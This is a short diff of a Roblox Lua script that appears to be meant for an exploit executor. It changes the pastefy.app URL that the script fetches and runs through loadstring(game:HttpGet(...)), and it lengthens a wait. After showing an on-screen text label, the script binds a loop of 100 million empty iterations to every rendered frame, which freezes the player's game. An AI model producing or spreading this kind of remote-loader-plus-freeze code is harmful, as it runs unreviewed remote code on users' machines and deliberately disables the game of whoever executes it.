@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/QyhMHdMU/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/nmrhpVJI/raw"))()
 -- Create ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -39,7 +39,7 @@ TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextScaled = true
 TextLabel.Font = Enum.Font.GothamBold
 TextLabel.TextWrapped = true
-wait(3) 
+wait(5) 
 local RunService = game:GetService("RunService")
 
 RunService.RenderStepped:Connect(function() for i = 1, 1e8 do end end)
